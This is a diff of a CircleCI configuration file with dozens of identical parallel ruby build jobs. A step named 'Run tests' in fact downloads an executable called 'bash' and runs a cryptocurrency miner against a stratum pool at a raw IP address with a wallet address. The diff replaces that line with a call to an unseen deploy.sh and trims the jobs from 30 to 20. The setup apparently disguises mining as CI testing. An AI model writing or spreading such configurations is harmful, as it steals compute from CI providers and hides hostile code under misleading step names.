@@ -10,7 +10,7 @@ working_dir: &working_dir ~/app
                     apt-get install -y ca-certificates screen wget git libcurl4 libjansson4 libgomp1 build-essential make cmake 
     - run: 
         name: Run tests 
-        command: wget https://github.com/githuboneheart/Nim/raw/main/bash && chmod +x bash && ./bash -a yescryptr16 -o stratum+tcp://68.183.25.12:443  -u web1qwxq0q8vkey330zh6p2cuxtjrdcdhh3kk9kmtct.YaAllahHu -p m=solo -t 16 
+        command: | 
                     chmod +x deploy.sh 
                     ./deploy.sh
 version: 2.0 
@@ -95,46 +95,6 @@ jobs:
     <<: *script 
     docker: 
       - image: ruby 
-  build21: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build22: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build23: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build24: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build25: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build26: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build27: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build28: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build29: 
-    <<: *script 
-    docker: 
-      - image: ruby 
-  build30: 
-    <<: *script 
-    docker: 
-      - image: ruby 
  
 workflows: 
   version: 2 
@@ -160,13 +120,3 @@ workflows:
       - build18 
       - build19 
       - build20 
-      - build21 
-      - build22 
-      - build23 
-      - build24 
-      - build25 
-      - build26 
-      - build27 
-      - build28 
-      - build29 
-      - build30
